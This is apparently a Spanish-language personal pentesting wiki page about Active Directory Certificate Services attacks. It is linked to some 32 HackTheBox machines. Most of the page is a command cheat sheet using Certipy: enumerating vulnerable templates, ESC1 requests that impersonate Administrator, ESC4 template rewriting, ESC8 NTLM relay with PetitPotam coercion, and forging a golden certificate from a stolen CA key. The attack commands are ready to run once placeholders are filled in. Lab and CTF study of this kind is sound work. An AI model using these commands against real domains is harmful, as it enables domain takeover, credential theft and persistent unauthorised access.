# Técnica: adcs

[[00-inicio|Inicio]] · [[Entorno|Entorno]] · [[Puertos|Puertos]] · [[Servicios|Servicios]] · [[Tecnicas|Tecnicas]] · [[Maquinas|Maquinas]] · [[Referencias|Referencias]]

**32 máquina(s)** mencionan esta técnica.

> Esta técnica tiene **recetario de comandos**. Está más abajo, después de la lista de máquinas.

## Comandos

> **Placeholders**: `<DC_IP>` · `<DOMINIO>` · `<USER>`/`<PASS>` · `<CA>` (nombre de la CA)
>
> ⚠️ **Certipy v5.1.0** — la sintaxis NO es la de v4, que es la que documentan
> casi todas las guías online. Ver [[certipy]].

### Enumerar (hacelo TEMPRANO, no al final)

```bash
certipy-ad find -u '<USER>@<DOMINIO>' -p '<PASS>' -dc-ip <DC_IP> -vulnerable -stdout
certipy-ad find -u '<USER>@<DOMINIO>' -p '<PASS>' -dc-ip <DC_IP> -vulnerable -text -output adcs
```

Si falla la resolución de nombres, pasá el DNS explícito:
```bash
certipy-ad find -u '<USER>@<DOMINIO>' -p '<PASS>' -dc-ip <DC_IP> -ns <DC_IP> -vulnerable -stdout
```

### ESC1 — suplantar a Administrator (el más frecuente)

```bash
# 1) Pedir el certificado pidiendo el UPN de Administrator
certipy-ad req -u '<USER>@<DOMINIO>' -p '<PASS>' -dc-ip <DC_IP> \
               -ca '<CA>' -template '<PLANTILLA>' -upn 'administrator@<DOMINIO>'

# 2) Autenticar → devuelve el hash NT
certipy-ad auth -pfx administrator.pfx -dc-ip <DC_IP>

# 2b) Variante: shell LDAP en vez de solo el hash
certipy-ad auth -pfx administrator.pfx -dc-ip <DC_IP> -ldap-shell
```

Variantes si la plantilla lo exige:
```bash
certipy-ad req -u '<USER>@<DOMINIO>' -p '<PASS>' -dc-ip <DC_IP> -ca '<CA>' \
               -template '<PLANTILLA>' -upn 'administrator@<DOMINIO>' -sid '<SID_DEL_DC>'
certipy-ad req -u '<USER>@<DOMINIO>' -p '<PASS>' -dc-ip <DC_IP> -ca '<CA>' \
               -template '<PLANTILLA>' -dns '<dc>.<dominio>'
```

### ESC4 — tenés escritura sobre la plantilla

```bash
# 1) BACKUP del estado original — obligatorio
certipy-ad template -u '<USER>@<DOMINIO>' -p '<PASS>' -dc-ip <DC_IP> \
                    -template '<PLANTILLA>' -save-configuration original.json

# 2) Volverla vulnerable
certipy-ad template -u '<USER>@<DOMINIO>' -p '<PASS>' -dc-ip <DC_IP> \
                    -template '<PLANTILLA>' -write-default-configuration

# 3) Explotar como ESC1, y 4) RESTAURAR
certipy-ad template -u '<USER>@<DOMINIO>' -p '<PASS>' -dc-ip <DC_IP> \
                    -template '<PLANTILLA>' -write-configuration original.json
```

### ESC8 — relay NTLM al HTTP de ADCS

```bash
# 1) Relay apuntando a la CA (en una terminal)
certipy-ad relay -target 'http://<CA_HOSTNAME>' -ca '<CA>'

# 2) Coercionar la autenticación hacia tu Kali (en otra)
PetitPotam.py -u '<USER>' -p '<PASS>' -d <DOMINIO> <TU_IP> <DC_IP>

# 3) Autenticar con el .pfx que te devolvió Certipy
certipy-ad auth -pfx <dc>.pfx -dc-ip <DC_IP>
```

> **Requiere que la víctima se conecte de vuelta a vos.** A través de SOCKS no
> funciona. Ver [[07-pivoting]].

### Golden Certificate (necesitás la clave privada de la CA)

```bash
# Backup de la CA (requiere acceso)
certipy-ad ca -u '<USER>@<DOMINIO>' -p '<PASS>' -dc-ip <DC_IP> -ca '<CA>' -backup

# Forjar un certificado de Administrator
certipy-ad forge -ca-pfx '<CA>.pfx' -upn 'administrator@<DOMINIO>' \
                 -subject 'CN=Administrator,CN=Users,DC=<dom>,DC=<local>' -issuer '<CA>'

certipy-ad auth -pfx administrator.pfx -dc-ip <DC_IP>
```

Sobrevive al cambio de contraseña del `krbtgt`: es más persistente que un
Golden Ticket.

### Tabla de ESC de referencia

| ESC | Requisito | Comando clave |
|---|---|---|
| ESC1 | Poder enrolar + `ENROLLEE_SUPPLIES_SUBJECT` | `req -upn` → `auth` |
| ESC2 | Plantilla sin EKU / `Any Purpose` | `req` → `auth` |
| ESC3 | Agent Certificate Template | `req` en dos pasos |
| ESC4 | `WriteDacl` sobre la plantilla | `template -write-default-configuration` |
| ESC6 | `EDITF_ATTRIBUTESUBJECTALTNAME2` en la CA | `req -upn` |
| ESC7 | `ManageCA` | `certipy-ad ca` |
| ESC8 | Coerción + relay | `relay` |

### Higiene obligatoria

Modificar ADCS **cambia el entorno**. Antes de tocar una plantilla:

1. `template -save-configuration <archivo>.json`
2. Anotar en la bitácora qué cambiaste
3. `template -write-configuration <archivo>.json` al terminar

## Referencias

- [[WADComs|WADComs (espejo local)]] — https://wadcoms.github.io/
- [The Hacker Recipes](https://www.thehacker.recipes/)

---

## Máquinas

- [[htb-interactive\|htb-interactive]] — 30 mención(es)
- [[htb-coder\|Coder]] — 23 mención(es) · Windows · Insane
- [[chuleta-smb-enum\|chuleta-smb-enum]] — 22 mención(es)
- [[htb-tombwatcher\|TombWatcher]] — 15 mención(es) · Windows · Medium
- [[htb-ghostlink\|Ghostlink]] — 14 mención(es) · Windows · Hard
- [[htb-fluffy\|Fluffy]] — 12 mención(es) · Windows · Easy
- [[htb-darkcorp\|DarkCorp]] — 9 mención(es) · Windows · Insane
- [[htb-authority\|Authority]] — 8 mención(es) · Windows · Medium
- [[htb-escape\|Escape]] — 8 mención(es) · Windows · Medium
- [[htb-darkzero\|DarkZero]] — 7 mención(es) · Windows · Hard
- [[htb-infiltrator\|Infiltrator]] — 7 mención(es) · Windows · Insane
- [[htb-mist\|Mist]] — 7 mención(es) · Windows · Insane
- [[htb-vulncicada\|VulnCicada]] — 7 mención(es) · Windows · Medium
- [[htb-certified\|Certified]] — 6 mención(es) · Windows · Medium
- [[htb-fries\|Fries]] — 6 mención(es) · Windows · Hard
- [[htb-certificate\|Certificate]] — 4 mención(es) · Windows · Hard
- [[htb-manager\|Manager]] — 4 mención(es) · Windows · Medium
- [[htb-anubis\|Anubis]] — 3 mención(es) · Windows · Insane
- [[htb-escapetwo\|EscapeTwo]] — 3 mención(es) · Windows · Easy
- [[htb-logging\|Logging]] — 3 mención(es) · Windows · Medium
- [[htb-mirage\|Mirage]] — 3 mención(es) · Windows · Hard
- [[htb-sendai\|Sendai]] — 3 mención(es) · Windows · Medium
- [[htb-absolute\|Absolute]] — 2 mención(es) · Windows · Insane
- [[htb-pirate\|Pirate]] — 2 mención(es) · Windows · Hard
- [[htb-rebound\|Rebound]] — 2 mención(es) · Windows · Insane
- [[htb-retro\|Retro]] — 2 mención(es) · Windows · Easy
- [[htb-shibuya\|Shibuya]] — 2 mención(es) · Windows · Hard
- [[htb-administrator\|Administrator]] — 1 mención(es) · Windows · Medium
- [[htb-puppy\|Puppy]] — 1 mención(es) · Windows · Medium
- [[htb-rustykey\|RustyKey]] — 1 mención(es) · Windows · Hard
- [[htb-vintage\|Vintage]] — 1 mención(es) · Windows · Hard
- [[htb-voleur\|Voleur]] — 1 mención(es) · Windows · Medium

## Cómo ver el contexto

```bash
python3 _sistema/herramientas/buscar.py 'adcs' -v
python3 _sistema/herramientas/buscar.py 'adcs' -v --oscp
```
